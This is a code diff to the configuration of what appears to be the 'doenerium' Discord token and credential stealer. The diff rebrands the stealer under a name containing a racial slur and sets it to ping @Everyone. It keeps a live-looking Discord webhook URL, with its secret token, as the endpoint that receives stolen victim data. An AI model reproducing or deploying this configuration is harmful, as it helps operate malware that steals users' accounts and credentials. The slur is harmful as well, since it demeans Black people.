@@ -11,7 +11,7 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-    brand: "doenerium",
+    brand: "NiggaGrabber",
 
     webhook: "https://discord.com/api/webhooks/983442437605326848/E8DebpKbfQ2ypujIJmOX4rrGLEp2wemfERI_49jF1x748GGUkSEDcb-fRG31ax6eWkL4",
 
@@ -20,15 +20,15 @@ var config = {
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@doener"],
+    ping: [true, "@Everyone"],
 
     embed: {
-        username: "doenerium | t.me/doener2323",
+        username: "NiggaGrabber",
         footer: {
-            text: `doenerium | t.me/doener2323`,
+            text: `NiggaGrabber`,
             icon_url: "https://c.tenor.com/PrhwVabg7KIAAAAS/cursed-goat.gif",
         },
-        href: "https://t.me/doener2323",
+        href: "NiggaGrabber",
         avatar_url: "https://c.tenor.com/PrhwVabg7KIAAAAS/cursed-goat.gif"
     },
 
